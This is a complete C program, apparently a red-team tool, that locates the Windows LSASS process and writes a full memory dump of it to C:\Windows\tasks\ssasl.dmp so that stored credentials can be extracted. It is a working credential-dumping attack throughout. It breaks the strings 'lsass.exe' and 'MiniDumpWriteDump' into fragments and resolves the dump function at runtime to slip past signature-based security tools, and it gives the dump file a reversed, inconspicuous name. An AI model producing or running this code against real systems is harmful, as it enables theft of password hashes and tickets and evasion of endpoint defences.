/*

    Author: vari.sh

    Description: This program implements LSASS dump
                 
*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <tchar.h>
#include <stdio.h>

typedef BOOL(WINAPI* PFN_MiniDumpWriteDump)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
    );

int _tmain(void)
{
    TCHAR part1[] = _T("lsa");
    TCHAR part2[] = _T("ss");
    TCHAR part3[] = _T(".ex");
    TCHAR part4[] = _T("e");
    TCHAR targetProcessName[50] = { 0 };
    _stprintf(targetProcessName, _T("%s%s%s%s"), part1, part2, part3, part4);

    DWORD targetPID = 0;

    // Create a snapshot of active processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        _tprintf(_T("Unable to create process snapshot.\n"));
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_tcsicmp(pe.szExeFile, targetProcessName) == 0)
            {
                targetPID = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (targetPID == 0)
    {
        _tprintf(_T("Target process not found.\n"));
        return 1;
    }

    // Open the target process with all privileges (requires elevation)
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess)
    {
        _tprintf(_T("Unable to open target process (PID: %lu).\n"), targetPID);
        return 1;
    }

    // Create the dump file
    HANDLE hFile = CreateFile(_T("C:\\Windows\\tasks\\ssasl.dmp"),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        _tprintf(_T("Unable to create dump file.\n"));
        CloseHandle(hProcess);
        return 1;
    }

    HMODULE hDbghelp = LoadLibrary(_T("dbghelp.dll"));
    if (!hDbghelp)
    {
        _tprintf(_T("Unable to load dbghelp.dll.\n"));
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return 1;
    }

    char mdPart1[] = "Mini";
    char mdPart2[] = "Dump";
    char mdPart3[] = "Write";
    char mdPart4[] = "Dump";
    char miniFuncName[100] = { 0 };
    sprintf(miniFuncName, "%s%s%s%s", mdPart1, mdPart2, mdPart3, mdPart4);

    PFN_MiniDumpWriteDump pMiniDumpWriteDump = (PFN_MiniDumpWriteDump)GetProcAddress(hDbghelp, miniFuncName);
    if (!pMiniDumpWriteDump)
    {
        _tprintf(_T("Unable to retrieve the address of MiniDumpWriteDump.\n"));
        FreeLibrary(hDbghelp);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return 1;
    }

    // Perform a dump of the target process
    BOOL dumped = pMiniDumpWriteDump(
        hProcess,               // Handle to the target process
        targetPID,              // Process ID
        hFile,                  // Handle to the dump file
        MiniDumpWithFullMemory, // Dump type
        NULL,                   // Exception param
        NULL,                   // User stream param
        NULL                    // Callback param
    );

    if (dumped)
    {
        _tprintf(_T("Dump completed.\n"));
    }
    else
    {
        _tprintf(_T("Dump failed. Error code: %lu\n"), GetLastError());
    }

    // Clean up resources
    FreeLibrary(hDbghelp);
    CloseHandle(hFile);
    CloseHandle(hProcess);

    return 0;
}
